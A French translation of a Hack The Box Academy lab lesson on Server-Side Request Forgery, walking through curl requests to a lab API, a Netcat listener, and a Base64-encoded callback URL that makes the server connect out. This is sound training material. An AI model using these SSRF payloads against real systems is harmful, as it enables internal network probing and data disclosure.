SSRF
* * * * *

Les attaques Server-Side Request Forgery (SSRF), répertoriées dans le top 10 de l'OWASP, nous permettent d'abuser des fonctionnalités du serveur pour effectuer des demandes de ressources internes ou externes au nom du serveur. Nous devons généralement fournir ou modifier les URL utilisées par l'application cible pour lire ou soumettre des données. L'exploitation des vulnérabilités de SSRF peut entraîner :

-   Interagir avec des systèmes internes connus
-   Découverte des services internes via des scans de port
-   Divulgation de données locales/sensibles
-   Inclure des fichiers dans l'application cible
-   Fuite de hachages NetNTLM à l'aide de chemins UNC (Windows)
-   Réaliser l'exécution de code à distance

Nous pouvons généralement trouver des vulnérabilités SSRF dans des applications ou des API qui récupèrent des ressources distantes. Notre module [Server-side Attacks](https://academy.hackthebox.com/module/details/145) couvre SSRF en détail.

Comme nous l'avons mentionné à plusieurs reprises, cependant, nous devrions fuzzer chaque paramètre identifié, même s'il ne semble pas chargé de récupérer des ressources distantes.

Évaluons ensemble une API vulnérable à SSRF.

Allez à la fin de cette section et cliquez sur `Click here to spawn the target system!`ou sur l' `Reset Target`icône . Utilisez la Pwnbox fournie ou une machine virtuelle locale avec la clé VPN fournie pour atteindre l'API cible et suivez-la.

Supposons que nous évaluons une telle API résidant dans `http://<TARGET IP>:3000/api/userinfo`.

Interagissons d'abord avec lui.

```
dsgsec@htb[/htb]$ curl http://<TARGET IP>:3000/api/userinfo
{"success":false,"error":"'id' parameter is not given."}

```

L'API attend un paramètre appelé *id* . Puisque nous souhaitons identifier les vulnérabilités de SSRF dans cette section, configurons d'abord un écouteur Netcat.

```
dsgsec@htb[/htb]$ nc -nlvp 4444
listening on [any] 4444 ...

```

Ensuite, spécifions `http://<VPN/TUN Adapter IP>:<LISTENER PORT>`comme valeur du paramètre *id* et effectuons un appel API.

```
dsgsec@htb[/htb]$ curl "http://<TARGET IP>:3000/api/userinfo?id=http://<VPN/TUN Adapter IP>:<LISTENER PORT>"
{"success":false,"error":"'id' parameter is invalid."}

```

Nous remarquons une erreur indiquant que le paramètre *id* n'est pas valide, et nous remarquons également qu'aucune connexion n'est établie avec notre écouteur.

Dans de nombreux cas, les API attendent des valeurs de paramètre dans un format/encodage spécifique. Essayons d'encoder en Base64 `http://<VPN/TUN Adapter IP>:<LISTENER PORT>`et d'effectuer à nouveau un appel d'API.

```
dsgsec@htb[/htb]$ echo "http://<VPN/TUN Adapter IP>:<LISTENER PORT>" | tr -d '\n' | base64
dsgsec@htb[/htb]$ curl "http://<TARGET IP>:3000/api/userinfo?id=<BASE64 blob>"

```

Lorsque vous effectuez l'appel API, vous remarquerez qu'une connexion est établie avec votre écouteur Netcat. L'API est vulnérable à SSRF.

```
dsgsec@htb[/htb]$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [<VPN/TUN Adapter IP>] from (UNKNOWN) [<TARGET IP>] 50542
GET / HTTP/1.1
Accept: application/json, text/plain, */*
User-Agent: axios/0.24.0
Host: <VPN/TUN Adapter IP>:4444
Connection: close

```

Si le temps le permet, essayez de fournir aux API des entrées dans différents formats/encodages.
